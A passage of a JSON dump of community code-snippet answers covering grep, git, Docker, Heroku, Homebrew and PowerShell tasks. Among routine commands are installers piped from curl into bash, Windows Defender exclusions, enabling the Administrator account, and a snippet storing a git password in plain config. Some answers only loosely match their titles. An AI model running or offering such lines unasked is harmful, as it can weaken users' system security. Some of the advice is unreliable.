    "description": "grep CRON /var/log/syslog\n",
    "reg_date": "2021-10-11T22:05:57.000Z"
  },
  {
    "id": 2076,
    "keyword": null,
    "link": null,
    "title": " grep docker logs",
    "description": "docker logs nginx 2>&1 | grep \"127.\" \n",
    "reg_date": "2021-10-11T22:05:57.000Z"
  },
  {
    "id": 2077,
    "keyword": null,
    "link": null,
    "title": " grep exclude directory",
    "description": "grep -rli --exclude-dir={dir1,dir2,dir3} keyword /path/to/search\ngrep -rli --exclude-dir=/path/to/exclude \"keyword\"\n",
    "reg_date": "2021-10-11T22:05:58.000Z"
  },
  {
    "id": 2078,
    "keyword": null,
    "link": null,
    "title": " grep filename only",
    "description": "grep -l\n",
    "reg_date": "2021-10-11T22:05:58.000Z"
  },
  {
    "id": 2079,
    "keyword": null,
    "link": null,
    "title": " grep for all .py files containing a word",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\n",
    "reg_date": "2021-10-11T22:05:58.000Z"
  },
  {
    "id": 2080,
    "keyword": null,
    "link": null,
    "title": " grep ignore case",
    "description": "grep -i\n",
    "reg_date": "2021-10-11T22:05:58.000Z"
  },
  {
    "id": 2081,
    "keyword": null,
    "link": null,
    "title": " grep in all files",
    "description": "grep -rni \"string\" *\n",
    "reg_date": "2021-10-11T22:05:58.000Z"
  },
  {
    "id": 2082,
    "keyword": null,
    "link": null,
    "title": " grep ip address",
    "description": "grep -oE \"\\b([0-9]{1,3}\\.){3}([0-9]{1,3})\\b\" $file\n",
    "reg_date": "2021-10-11T22:05:58.000Z"
  },
  {
    "id": 2083,
    "keyword": null,
    "link": null,
    "title": " grep lines after match",
    "description": "$ grep -A1 text  -AX tells grep to display 'X' amount of lines after line of match.  Use -BX to do the same but before.\nInclude -A flag to add lines after match and -B flag to add lines before grep match -A 3\t#display match line and 3 after lines grep match -B 2 #display match line and 2 lines before\n",
    "reg_date": "2021-10-11T22:05:59.000Z"
  },
  {
    "id": 2084,
    "keyword": null,
    "link": null,
    "title": " grep list command",
    "description": "history|grep <search>\n",
    "reg_date": "2021-10-11T22:05:59.000Z"
  },
  {
    "id": 2085,
    "keyword": null,
    "link": null,
    "title": " grep more than one word",
    "description": "Just use one of following forms with grep or egrep commands :) grep \"PATTERN1\\|PATTERN2\" FILE grep -E \"PATTERN1|PATTERN2\" FILE grep -e PATTERN1 -e PATTERN2 FILE egrep \"PATTERN1|PATTERN2\" FILE\n# Basic syntax: grep 'word1\\|word2\\|word3' /path/to/file # This prints all lines that match word1, word2, OR, word3\n",
    "reg_date": "2021-10-11T22:05:59.000Z"
  },
  {
    "id": 2086,
    "keyword": null,
    "link": null,
    "title": " grep print only capture group",
    "description": "## Short answer: $ grep -oP 'stuff before your match\\Kyour match(?=stuff after your match)'  ## Explanation:  # GNU grep has the -P option for perl-style regexes, and the -o option to print # only what matches the pattern.  # These can be combined by using perl-style look-around assertions (described # under Extended Patterns in the perlre manpage) to not count the beginning and # end of the regex as part of the match that -o will grab.  # Prefix your match pattern with \\K to exclude the beginning. \\K is the shorter # (and more efficient) form of (?<=pattern), a zero-width look-behind assertion # that means, \"Matches must come after this.\"  # Put anything following your match pattern within (?=pattern). This is a zero- # width look-ahead assertion that means, \"Matches must be followed by this.\"  # set up a test file for reference $ echo ' foobar bash 1 bash foobar happy foobar foo bar foo 123 bar foo abc bar ' > test.txt  $ grep -oP 'foobar \\K\\w+' test.txt # bash # happy  $ grep -oP 'foo \\K\\w+(?= bar)' test.txt # 123 # abc \n# matches and returns b $ echo \"abc\" | grep -oP \"a\\K(b)(?=c)\"  b  # no match $ echo \"abc\" | grep -oP \"z\\K(b)(?=c)\" # no match $ echo \"abc\" | grep -oP \"a\\K(b)(?=d)\"\n",
    "reg_date": "2021-10-11T22:05:59.000Z"
  },
  {
    "id": 2087,
    "keyword": null,
    "link": null,
    "title": " grep process id",
    "description": "ps ax | grep <process_name>\n",
    "reg_date": "2021-10-11T22:06:00.000Z"
  },
  {
    "id": 2088,
    "keyword": null,
    "link": null,
    "title": " grep remove branches",
    "description": "Type in git branch | grep \"<pattern>\" for a preview of the branches that will be deleted. Type in git branch | grep \"<pattern>\" | xargs git branch -D.\n",
    "reg_date": "2021-10-11T22:06:00.000Z"
  },
  {
    "id": 2089,
    "keyword": null,
    "link": null,
    "title": " grep tail",
    "description": "tail -f file | grep --line-buffered my_pattern\n",
    "reg_date": "2021-10-11T22:06:00.000Z"
  },
  {
    "id": 2090,
    "keyword": null,
    "link": null,
    "title": " grep two lines",
    "description": "$ grep -A1 text  -AX tells grep to display 'X' amount of lines after line of match.  Use -BX to do the same but before.\n$ grep -e sweet -e lemon file_type This is a sweet lemon. \n",
    "reg_date": "2021-10-11T22:06:00.000Z"
  },
  {
    "id": 2091,
    "keyword": null,
    "link": null,
    "title": " grepper",
    "description": "one Like For Grepper Community\nGrepper's cool\nfact = \"Grepper's good stuff!\" print(fact)\nbest tool forever!\nIlikethisbecauseitmakesmylifeabiteasier.\nGrepper is perfect dictonary for helping codes you are looking around\nGrepper is a cool tool\nGrepper is amazing, I highly recommend it!!\nLove Grepper\nGREPPER IS THE BEST!\n",
    "reg_date": "2021-10-11T22:06:00.000Z"
  },
  {
    "id": 2092,
    "keyword": null,
    "link": null,
    "title": " grepper brasil",
    "description": "# https://chrome.google.com/webstore/detail/grepper/amaaokahonnfjjemodnpmeenfpnnbkco #grepper brasil #grepper brazil grepper &eacute; Top\n",
    "reg_date": "2021-10-11T22:06:00.000Z"
  },
  {
    "id": 2093,
    "keyword": null,
    "link": null,
    "title": " grepper brazil",
    "description": "#grepper brasil #grepper brazil grepper &eacute; Top\n",
    "reg_date": "2021-10-11T22:06:00.000Z"
  },
  {
    "id": 2094,
    "keyword": null,
    "link": null,
    "title": " grub change default os",
    "description": "1. Find the string for the OS you want to set as the default with:  \t$ grep menuentry /boot/grub/grub.cfg  2. Highlight the string and copy it to the clipboard. (include the quotes.)  \te.g. \"Windows 10 (loader) (on /dev/sda1)\"  3. Edit /etc/default/grub  \t$ sudo vi /etc/default/grub  4. Change the value of GRUB_DEFAULT from 0 to the OS string you copied and save.  5. Update Grub menu, by running the following command:  \t$ sudo update-grub\t  6. Reboot the computer to verify the expected OS is the default. \nGRUB_DEFAULT=saved \n",
    "reg_date": "2021-10-11T22:06:01.000Z"
  },
  {
    "id": 2095,
    "keyword": null,
    "link": null,
    "title": " guipir chrome extension",
    "description": "# https://chrome.google.com/webstore/detail/grepper/amaaokahonnfjjemodnpmeenfpnnbkco #grepper brasil #grepper brazil grepper &eacute; Top\n",
    "reg_date": "2021-10-11T22:06:01.000Z"
  },
  {
    "id": 2096,
    "keyword": null,
    "link": null,
    "title": " gulp cli",
    "description": "npm install --global gulp-cli\nnpm install gulp\n",
    "reg_date": "2021-10-11T22:06:01.000Z"
  },
  {
    "id": 2097,
    "keyword": null,
    "link": null,
    "title": " gumlet/php-image-resize 1.9.2 requires ext-gd *",
    "description": "#php -v to get version (change to php7.2 or whatever version if needed) sudo apt-get install php7.0-gd\n",
    "reg_date": "2021-10-11T22:06:01.000Z"
  },
  {
    "id": 2098,
    "keyword": null,
    "link": null,
    "title": " gyp: No Xcode or CLT version detected!",
    "description": "sudo rm -rf $(xcode-select -print-path) xcode-select --install\n",
    "reg_date": "2021-10-11T22:06:01.000Z"
  },
  {
    "id": 2099,
    "keyword": null,
    "link": null,
    "title": " gyp ERR! find Python",
    "description": "npm --add-python-to-path='true' --debug install --global windows-build-tools \nFROM node:alpine as build-stage RUN apk add --no-cache python3 py3-pip make g++ \napt-get update      apt-get install python2.7     ln -s /usr/bin/python2.7 /usr/bin/python \n",
    "reg_date": "2021-10-11T22:06:01.000Z"
  },
  {
    "id": 2100,
    "keyword": null,
    "link": null,
    "title": " gyp ERR! stack Error: not found: make",
    "description": "$ sudo apt-get install build-essential \n",
    "reg_date": "2021-10-11T22:06:01.000Z"
  },
  {
    "id": 2101,
    "keyword": null,
    "link": null,
    "title": " gyp error npm install",
    "description": "npm audit fix --force \n# Open the terminal as an administrator # Go to your project folder and run: npm config set node_gyp npm config set msvs_version 2017 npm i\n",
    "reg_date": "2021-10-11T22:06:02.000Z"
  },
  {
    "id": 2102,
    "keyword": null,
    "link": null,
    "title": " gzip folder with tar",
    "description": "# gzip my-folder-name # # flags: # \tz = filter the archive through gzip # \tc = create a new archive # \tv = verbosely list files processed # \tf = use archive file or device ARCHIVE # # Example: tar -zcvf my-filename.tar.gz my-folder-name\n",
    "reg_date": "2021-10-11T22:06:02.000Z"
  },
  {
    "id": 2103,
    "keyword": null,
    "link": null,
    "title": " hapus folder di linux",
    "description": "rm -rf Dir1 Dir2 Dir3\n",
    "reg_date": "2021-10-11T22:06:02.000Z"
  },
  {
    "id": 2104,
    "keyword": null,
    "link": null,
    "title": " hard reset git branch",
    "description": "git fetch origin git reset --hard origin/master\ngit fetch origin git reset --hard origin/main\ngit reset --hard origin/master; git commit -m 'reset to remote';git push --force local dev\ngit checkout reset HEAD~1\n",
    "reg_date": "2021-10-11T22:06:02.000Z"
  },
  {
    "id": 2105,
    "keyword": null,
    "link": null,
    "title": " has add permission() takes 2 positional arguments but 3 were given",
    "description": "#change: def has_add_permission(self, request):     return False #to:  def has_add_permission(self, request, obj=None):     return False\n",
    "reg_date": "2021-10-11T22:06:02.000Z"
  },
  {
    "id": 2106,
    "keyword": null,
    "link": null,
    "title": " hash bang bash",
    "description": "#!/bin/bash OR  #!/usr/bin/perl OR  #!/usr/bin/python OR  #!/usr/bin/python3 OR  #!/usr/bin/env bash\n",
    "reg_date": "2021-10-11T22:06:02.000Z"
  },
  {
    "id": 2107,
    "keyword": null,
    "link": null,
    "title": " hash sum mismatch ubuntu",
    "description": "sudo rm -rf /var/lib/apt/lists/partial sudo apt-get update -o Acquire::CompressionTypes::Order::=gz\nsudo rm -rf /var/lib/apt/lists/* sudo apt-get update -o Acquire::CompressionTypes::Order::=gz sudo apt-get update && sudo apt-get upgrade\n",
    "reg_date": "2021-10-11T22:06:02.000Z"
  },
  {
    "id": 2108,
    "keyword": null,
    "link": null,
    "title": " hash sum mismatch ubuntu 20.04",
    "description": "sudo rm -rf /var/lib/apt/lists/partial sudo apt-get update -o Acquire::CompressionTypes::Order::=gz\nsudo rm -rf /var/lib/apt/lists/* sudo apt-get update -o Acquire::CompressionTypes::Order::=gz sudo apt-get update && sudo apt-get upgrade\n",
    "reg_date": "2021-10-11T22:06:03.000Z"
  },
  {
    "id": 2109,
    "keyword": null,
    "link": null,
    "title": " headphone jack not working in macbook pro",
    "description": "sudo pkill coreaudiod\n",
    "reg_date": "2021-10-11T22:06:03.000Z"
  },
  {
    "id": 2110,
    "keyword": null,
    "link": null,
    "title": " hello world powershell",
    "description": "Write-Host \"Hello World!\"\n",
    "reg_date": "2021-10-11T22:06:03.000Z"
  },
  {
    "id": 2111,
    "keyword": null,
    "link": null,
    "title": " heroku cli delete app",
    "description": "$ heroku apps:destroy [YOUR-APP-HERE]\nheroku apps:destroy <app_name>\n",
    "reg_date": "2021-10-11T22:06:03.000Z"
  },
  {
    "id": 2112,
    "keyword": null,
    "link": null,
    "title": " heroku cli login",
    "description": "heroku login --interactive   OR  heroku login -i\nnpm i -g heroku code to install heroku in windows \n",
    "reg_date": "2021-10-11T22:06:03.000Z"
  },
  {
    "id": 2113,
    "keyword": null,
    "link": null,
    "title": " heroku delete app",
    "description": "git remote rm heroku \n$ heroku apps:destroy [YOUR-APP-HERE]\nheroku apps:destroy <app_name>\nFrom The Heroku Webpage Dashboard => Your App Name => Resources => Pencil icon=> Flip the switch => Confirm\n",
    "reg_date": "2021-10-11T22:06:04.000Z"
  },
  {
    "id": 2114,
    "keyword": null,
    "link": null,
    "title": " heroku install classic",
    "description": "$ npm install -g heroku \n",
    "reg_date": "2021-10-11T22:06:04.000Z"
  },
  {
    "id": 2115,
    "keyword": null,
    "link": null,
    "title": " heroku logs",
    "description": "heroku logs --tail\n# Display all logs live heroku logs -t -a YOUR_APP_NAME  # Only display stdout of your app heroku logs -t -s app -a YOUR_APP_NAME\n",
    "reg_date": "2021-10-11T22:06:04.000Z"
  },
  {
    "id": 2116,
    "keyword": null,
    "link": null,
    "title": " heroku restart",
    "description": "heroku ps:restart web -a <my app name>\nheroku restart -a app_name  # The -a is the same as --app \n$ heroku ps:stop run.1 Stopping run.1 process... done \n",
    "reg_date": "2021-10-11T22:06:04.000Z"
  },
  {
    "id": 2117,
    "keyword": null,
    "link": null,
    "title": " heroku scale dynos",
    "description": "# One web dyno running heroku ps:scale web=1  # One web dyno + one worker dyno  # A worker dyno is a dyno that does process types that isn't a web in your procfile heroku ps:scale web=1 worker=1  # Two web dyno + one worker dyno heroku ps:scale web=2 worker=1  # If you want different dyno types (standard-2x etc) do this: heorku ps:scale web=2:standard-2x  # If you want no dynos running, just scale it to zero: heroku ps:scale web=0 worker=0\n",
    "reg_date": "2021-10-11T22:06:04.000Z"
  },
  {
    "id": 2118,
    "keyword": null,
    "link": null,
    "title": " hibernate ubuntu",
    "description": "sudo systemctl hibernate\n",
    "reg_date": "2021-10-11T22:06:04.000Z"
  },
  {
    "id": 2119,
    "keyword": null,
    "link": null,
    "title": " hide top bar ubuntu 20.04",
    "description": "sudo apt install gnome-shell-extension-autohidetopbar\n",
    "reg_date": "2021-10-11T22:06:04.000Z"
  },
  {
    "id": 2120,
    "keyword": null,
    "link": null,
    "title": " history cmder",
    "description": "Press \"Ctrl\" + \"r\" and then type your substring to search in your history. Last matching command line will be found, keep using \"Ctrl\" + \"r\" to find previous ones. Once you find your searched command just press \"Enter\": (reverse-i-search)`searched_substring': command_with_searched_substring\n",
    "reg_date": "2021-10-11T22:06:05.000Z"
  },
  {
    "id": 2121,
    "keyword": null,
    "link": null,
    "title": " hoiw to find a certain fil eon ubuntu",
    "description": "sudo apt-get install locate sudo updatedb locate filename\n",
    "reg_date": "2021-10-11T22:06:05.000Z"
  },
  {
    "id": 2122,
    "keyword": null,
    "link": null,
    "title": " homebrew Unknown command: cask",
    "description": "brew install --cask myprogram\n",
    "reg_date": "2021-10-11T22:06:05.000Z"
  },
  {
    "id": 2123,
    "keyword": null,
    "link": null,
    "title": " homebrew gcloud",
    "description": "brew install --cask google-cloud-sdk\n",
    "reg_date": "2021-10-11T22:06:05.000Z"
  },
  {
    "id": 2124,
    "keyword": null,
    "link": null,
    "title": " homebrew install git",
    "description": "brew install git #Check your Install using git --version\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n",
    "reg_date": "2021-10-11T22:06:05.000Z"
  },
  {
    "id": 2125,
    "keyword": null,
    "link": null,
    "title": " homebrew postgres",
    "description": "brew install postgresql\n",
    "reg_date": "2021-10-11T22:06:05.000Z"
  },
  {
    "id": 2126,
    "keyword": null,
    "link": null,
    "title": " homebrew restart service",
    "description": "brew services restart mysql\n",
    "reg_date": "2021-10-11T22:06:05.000Z"
  },
  {
    "id": 2127,
    "keyword": null,
    "link": null,
    "title": " homebrew terraform",
    "description": "brew install terraform\n",
    "reg_date": "2021-10-11T22:06:05.000Z"
  },
  {
    "id": 2128,
    "keyword": null,
    "link": null,
    "title": " host file in ubuntu",
    "description": "sudo nano /etc/hosts\n",
    "reg_date": "2021-10-11T22:06:06.000Z"
  },
  {
    "id": 2129,
    "keyword": null,
    "link": null,
    "title": " host fille",
    "description": "C:\\Windows\\System32\\Drivers\\etc\\hosts\n",
    "reg_date": "2021-10-11T22:06:06.000Z"
  },
  {
    "id": 2130,
    "keyword": null,
    "link": null,
    "title": " hosting spa on github pages",
    "description": "### Notes on client-side routing: ### GitHub Pages doesn&rsquo;t support routers that use the HTML5 `pushState` history API under the hood  ### (for example, React Router using `browserHistory`).  ### This is because when there is a fresh page load for a url like `http://user.github.io/todomvc/todos/42`,  ### where `/todos/42` is a frontend route,  ### the GitHub Pages server returns 404 because it knows nothing of `/todos/42`.  ### If you want to add a router to a project hosted on GitHub Pages,  ### here are a couple of solutions:*  ### You could switch from using HTML5 history API to routing with hashes.  ### If you use React Router, you can switch to `hashHistory` for this effect,  ### but the URL will be longer and more verbose  ### (for example, `http://user.github.io/todomvc/#/todos/42?_k=yknaj`).  ### [Read more](https://reacttraining.com/react-router/web/api/Router) about different history implementations in React Router.*  ### Alternatively, you can use a trick to teach GitHub Pages to handle 404 by redirecting  ### to your `index.html` page with a special redirect parameter.  ### You would need to add a `404.html` file with the redirection code to the `build` folder before deploying  ### your project, and you&rsquo;ll need to add code handling the redirect parameter to `index.html`.  ### You can find a detailed explanation of this technique [in this guide](https://github.com/rafrex/spa-github-pages).  ### Check the article for more info ### extra note from me: If you still can't get anything to render except the homepage even after giving the \"exact\" param ### then try moving your homepage router to the end of the switch tag ### that way it'll be checked at the very last for matching the url\n",
    "reg_date": "2021-10-11T22:06:06.000Z"
  },
  {
    "id": 2131,
    "keyword": null,
    "link": null,
    "title": " hosts file path windows 10",
    "description": "Hosts file location: C:\\Windows\\System32\\Drivers\\Etc\\hosts\nC:\\Windows\\System32\\Drivers\\etc\\hosts\n//The path to the hosts file folder (Windows) \t%WINDIR%\\System32\\drivers\\etc\n",
    "reg_date": "2021-10-11T22:06:06.000Z"
  },
  {
    "id": 2132,
    "keyword": null,
    "link": null,
    "title": " how can I find perticular extension in ubuntu?",
    "description": "find . -type f -name \"*.txt\"\n",
    "reg_date": "2021-10-11T22:06:06.000Z"
  },
  {
    "id": 2133,
    "keyword": null,
    "link": null,
    "title": " how can I see my gatsby version",
    "description": "gatsby --version \n",
    "reg_date": "2021-10-11T22:06:06.000Z"
  },
  {
    "id": 2134,
    "keyword": null,
    "link": null,
    "title": " how change your github username and password in terminal",
    "description": "git config --global user.email \"you@example.com\" git config --global user.name \"Your Name\" git config --global user.password \"your password\" \n",
    "reg_date": "2021-10-11T22:06:06.000Z"
  },
  {
    "id": 2135,
    "keyword": null,
    "link": null,
    "title": " how check status docker in ubuntu",
    "description": "sudo systemctl status docker #(OR) systemctl status docker.service # To check the status of Docker whether running or not.\n",
    "reg_date": "2021-10-11T22:06:07.000Z"
  },
  {
    "id": 2136,
    "keyword": null,
    "link": null,
    "title": " how completely remove kde",
    "description": "sudo apt-get remove plasma-desktop sudo apt-get autoremove \n",
    "reg_date": "2021-10-11T22:06:07.000Z"
  },
  {
    "id": 2137,
    "keyword": null,
    "link": null,
    "title": " how do i get the last commit",
    "description": "$ git reset --soft HEAD~1 \n",
    "reg_date": "2021-10-11T22:06:07.000Z"
  },
  {
    "id": 2138,
    "keyword": null,
    "link": null,
    "title": " how download google drive file with wget",
    "description": "// Files smaller than 100MB wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=FILEID' -O FILENAME  // Files bigger than 100MB wget --load-cookies /tmp/cookies.txt \"https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=FILEID' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\\1\\n/p')&id=FILEID\" -O FILENAME && rm -rf /tmp/cookies.txt\n",
    "reg_date": "2021-10-11T22:06:07.000Z"
  },
  {
    "id": 2139,
    "keyword": null,
    "link": null,
    "title": " how npm clean cache",
    "description": "npm cache clean --force\n",
    "reg_date": "2021-10-11T22:06:07.000Z"
  },
  {
    "id": 2140,
    "keyword": null,
    "link": null,
    "title": " how pip install on  centos",
    "description": "sudo yum install python-pip \n",
    "reg_date": "2021-10-11T22:06:07.000Z"
  },
  {
    "id": 2141,
    "keyword": null,
    "link": null,
    "title": " how reset commit git with losing changes",
    "description": "git reset HEAD~1 --soft   \n",
    "reg_date": "2021-10-11T22:06:07.000Z"
  },
  {
    "id": 2142,
    "keyword": null,
    "link": null,
    "title": " how ro rename a foldre powershell",
    "description": "Rename-Item D:\\temp\\Test D:\\temp\\Test1\n",
    "reg_date": "2021-10-11T22:06:07.000Z"
  },
  {
    "id": 2143,
    "keyword": null,
    "link": null,
    "title": " how run command in loop",
    "description": "// Run command in loop sleep not mandatory done is mandatory for i in {1..10}; do command; sleep 5; done  example for i in {1..10}; do echo -n \"This is a test in loop $i \"; sleep 5; done\n",
    "reg_date": "2021-10-11T22:06:08.000Z"
  },
  {
    "id": 2144,
    "keyword": null,
    "link": null,
    "title": " how see my user name mac terminal",
    "description": "whoami\n",
    "reg_date": "2021-10-11T22:06:08.000Z"
  },
  {
    "id": 2145,
    "keyword": null,
    "link": null,
    "title": " how to I display powershell function code",
    "description": "(get-command <FUNCTION_NAME>).definition\n",
    "reg_date": "2021-10-11T22:06:08.000Z"
  },
  {
    "id": 2146,
    "keyword": null,
    "link": null,
    "title": " how to I list powershell functions",
    "description": "ls function:\ndir function:\n",
    "reg_date": "2021-10-11T22:06:08.000Z"
  },
  {
    "id": 2147,
    "keyword": null,
    "link": null,
    "title": " how to Install nodejs on a chromebook",
    "description": "step 1: open a termnal step 2: type the folowing Into a termnal sudo apt-get update sudo apt-get install curl gnupg -y curl -sl https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install -y nodejs  this installs nodeJS v13.12.0\n",
    "reg_date": "2021-10-11T22:06:08.000Z"
  },
  {
    "id": 2148,
    "keyword": null,
    "link": null,
    "title": " how to access postgres CLI",
    "description": "# User postgres is default. It then may ask you for password.  psql -U postgres\n",
    "reg_date": "2021-10-11T22:06:08.000Z"
  },
  {
    "id": 2149,
    "keyword": null,
    "link": null,
    "title": " how to activate administrator account in windows 10 command prompt",
    "description": "net user administrator /active:yes\n",
    "reg_date": "2021-10-11T22:06:08.000Z"
  },
  {
    "id": 2150,
    "keyword": null,
    "link": null,
    "title": " how to activate utf16 in powershell",
    "description": "$OutputEncoding = New-Object -typename System.Text.UTF8Encoding or  >chcp 65001\n",
    "reg_date": "2021-10-11T22:06:09.000Z"
  },
  {
    "id": 2151,
    "keyword": null,
    "link": null,
    "title": " how to activate virtual environment in ubuntu 20.04",
    "description": "sudo apt-get install python3-venv   python3 -m venv .venv\npython3 -m venv .venv\npip3 install virtualenv  Collecting virtualenv   Downloading https://files.pythonhosted.org/packages/f7/69/9a07/virtualenv-16.7.4-py2.py3-none-any.whl (3.3MB)     100% |████████████████████████████████| 3.3MB 448kB/s Installing collected packages: virtualenv Successfully installed virtualenv-20.0.14 \n",
    "reg_date": "2021-10-11T22:06:09.000Z"
  },
  {
    "id": 2152,
    "keyword": null,
    "link": null,
    "title": " how to add an existing project to github",
    "description": "cd existing_folder git init git remote add origin https://gitlab.com/abc.git git add . git commit -m \"Initial commit\" git push -u origin master\n# Go into your existing directory and run below commands cd docker-spring-boot echo \"# docker-spring-boot\" >> README.md git init git add -A git commit -m \"first commit\" git branch -M master git remote add origin https://github.com/devopsmaster/docker-spring-boot.git git push -u origin master                   \ngit init git add . git commit -m \"First commit\" git remote add origin <remote repository URL> git remote -v git branch -M main git push -u origin main  1- # Create a new repository on GitHub. To avoid errors, do not initialize the new repository with README, license, or gitignore files. You can add these files after your project has been pushed to GitHub.  2- # Open Terminal.  3- # Change the current working directory to your local project.  4- # Initialize the local directory as a Git repository. $ git init  5- # Add the files in your new local repository. This stages them for the first commit. $ git add . # Adds the files in the local repository and stages them for commit. To unstage a file, use 'git reset HEAD YOUR-FILE'.  6- # Commit the files that you've staged in your local repository. $ git commit -m \"First commit\" # Commits the tracked changes and prepares them to be pushed to a remote repository. To remove this commit and modify the file, use 'git reset --soft HEAD~1' and commit and add the file again.  7- # At the top of your GitHub repository's Quick Setup page, click  to copy the remote repository URL.  8- # In Terminal, add the URL for the remote repository where your local repository will be pushed. $ git remote add origin <remote repository URL> # Sets the new remote $ git remote -v # Verifies the new remote URL  9- # Push the changes in your local repository to GitHub. $ git branch -M main $ git push -u origin main # Pushes the changes in your local repository up to the remote repository you specified as the origin\ngit remote add origin <remote repository URL> \ngit remote add origin        https://github.com/asd/FinraDeck.git (github adresi) &bull; git push -u origin master \ngit remote add origin remote repository URL git remote -v git push -f origin master\n",
    "reg_date": "2021-10-11T22:06:09.000Z"
  },
  {
    "id": 2153,
    "keyword": null,
    "link": null,
    "title": " how to add ca to linux",
    "description": "sudo cp foo.crt /usr/local/share/ca-certificates/foo.crt sudo update-ca-certificates\n",
    "reg_date": "2021-10-11T22:06:10.000Z"
  },
  {
    "id": 2154,
    "keyword": null,
    "link": null,
    "title": " how to add exclusion to windows defender command line",
    "description": "powershell -Command Add-MpPreference -ExclusionPath \"C:\\tmp\" powershell -Command Add-MpPreference -ExclusionProcess \"java.exe\" powershell -Command Add-MpPreference -ExclusionExtension \".java\"  powershell -Command Remove-MpPreference -ExclusionExtension \".java\"\n",
    "reg_date": "2021-10-11T22:06:10.000Z"
  },
  {
    "id": 2155,
    "keyword": null,
    "link": null,
    "title": " how to add existing heroku remote",
    "description": "git remote add heroku git@heroku.com:project.git \n$ heroku git:remote -a thawing-inlet-61413 set git remote heroku to https://git.heroku.com/thawing-inlet-61413.git \n",
    "reg_date": "2021-10-11T22:06:10.000Z"
  },
  {
    "id": 2156,
    "keyword": null,
    "link": null,
    "title": " how to add husky to angular",
    "description": "\"husky\": {     \"hooks\": {         \"pre-commit\": \"pretty-quick --staged && ng lint && ng test\",         \"pre-push\": \"ng build --aot true\"     } }\nnpm install husky --save-dev\n",
    "reg_date": "2021-10-11T22:06:10.000Z"
  },
  {
    "id": 2157,
    "keyword": null,
    "link": null,
    "title": " how to add multiple files in git",
    "description": "git add file1 file2 file3\ngit commit -a  \n",
    "reg_date": "2021-10-11T22:06:10.000Z"
  },
  {
    "id": 2158,
    "keyword": null,
    "link": null,
    "title": " how to add new origin in git",
    "description": "git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n below is used to a add a new remote:  git remote add origin git@github.com:User/UserRepo.git below is used to change the url of an existing remote repository:  git remote set-url origin git@github.com:User/UserRepo.git below will push your code to the master branch of the remote repository defined with origin and -u let you point your current local branch to the remote master branch:  git push -u origin master\ngit remote add origin <link>\n# To add origin $ git remote add origin <github repo link>\ngit remote add heroku https://git.heroku.com/arrecs.git git remote -v -> heroku\thttps://git.heroku.com/arrecs.git (fetch) -> heroku\thttps://git.heroku.com/arrecs.git (push)  git remote remove heroku git remote -v \ngit remote add new_repo_name ssh://git@somerepo.repo.dev:foo/bar/baz.git # Note the new_repo_name. This doesn't replace your origin. git remote -v # The above will display new_repo_name\thttps://second.repo.dev/foo/bar.git (fetch) new_repo_name\thttps://second.repo.dev/foo/bar.git (push) origin\t        https://first.repo.dev/bar/baz.git (fetch) origin \t        https://first.repo.dev/bar/baz.git (push)\n",
    "reg_date": "2021-10-11T22:06:10.000Z"
  },
  {
    "id": 2159,
    "keyword": null,
    "link": null,
    "title": " how to add numbers in linux command line shell",
    "description": "clear echo Enter 1st number read a echo Enter 2nd number read b sum=$(( $a + $b ))   echo \"Sum is: $sum\" \n",
    "reg_date": "2021-10-11T22:06:11.000Z"
  },
  {
    "id": 2160,
    "keyword": null,
    "link": null,
    "title": " how to add path in ubuntu",
    "description": " # Edit .bashrc, or .zshrc in your home directory and add the following line:  export PATH=\"/path/to/dir:$PATH\"  $ source ~/.bashrc source ~/.zshrc\nexport PATH=\"$HOME/bin:$PATH\" \nexport PATH=\"/path/to/dir:$PATH\" \n$ source ~/.bashrc \n",
    "reg_date": "2021-10-11T22:06:11.000Z"
  },
  {
    "id": 2161,
    "keyword": null,
    "link": null,
    "title": " how to add regex to ls",
    "description": "# Use find with -maxdepth 1 to act as ls # '' contain the regex find . -maxdepth 1 -regex '*.png'\n",
    "reg_date": "2021-10-11T22:06:11.000Z"
  },
  {
    "id": 2162,
    "keyword": null,
    "link": null,
    "title": " how to bash into docker container",
    "description": "docker exec -it <mycontainer> bash docker exec -it <mycontainer> sh ##for alpine\ndocker exec -it nginx /bin/bash\n",
    "reg_date": "2021-10-11T22:06:11.000Z"
  },
  {
    "id": 2163,
    "keyword": null,
    "link": null,
    "title": " how to brew install mongodb",
    "description": "#Step 1 $ brew tap mongodb/brew  #Step 2 to install latest community version $ brew install mongodb-community\nbrew services start mongodb-community@4.4 \n//Starts Mongdb server @ mongodb://127.0.0.1:27017/ brew services start mongodb-community@4.2 mongod --config /usr/local/etc/mongod.conf --fork ps aux | grep -v grep | grep mongod mongo\n",
    "reg_date": "2021-10-11T22:06:12.000Z"
  },
  {
    "id": 2164,
    "keyword": null,
    "link": null,
    "title": " how to build docker image",
    "description": "docker build <Dockerfile path> -t image-name  docker build . -t tag-service:v1  // -t flag is for tag name that you want to give\ndocker build --tag hello . \nsudo docker build -t flaskmongo . --no-cache\n# Use the official image as a parent image. FROM node:current-slim  # Set the working directory. WORKDIR /usr/src/app  # Copy the file from your host to your current location. COPY package.json .  # Run the command inside your image filesystem. RUN npm install  # Inform Docker that the container is listening on the specified port at runtime. EXPOSE 8080  # Run the specified command within the container. CMD [ \"npm\", \"start\" ]  # Copy the rest of your app's source code from your host to your image filesystem. COPY . . \n",
    "reg_date": "2021-10-11T22:06:12.000Z"
  },
  {
    "id": 2165,
    "keyword": null,
    "link": null,
    "title": " how to cd to a directory with spaces",
    "description": "Write the beginning of the directory and press \"tab\"  this will fill out the rest\n",
    "reg_date": "2021-10-11T22:06:12.000Z"
  },
  {
    "id": 2166,
    "keyword": null,
    "link": null,
    "title": " how to change a commit message after push",
    "description": "git commit --amend -m \"New commit message\" Then git push --force and you're done\ngit commit --amend \ngit push --force <repository> <branch> \n",
    "reg_date": "2021-10-11T22:06:12.000Z"
  },
  {
    "id": 2167,
    "keyword": null,
    "link": null,
    "title": " how to change a user email for a project in git",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\n",
    "reg_date": "2021-10-11T22:06:12.000Z"
  },
  {
    "id": 2168,
    "keyword": null,
    "link": null,
    "title": " how to change account in git bash",
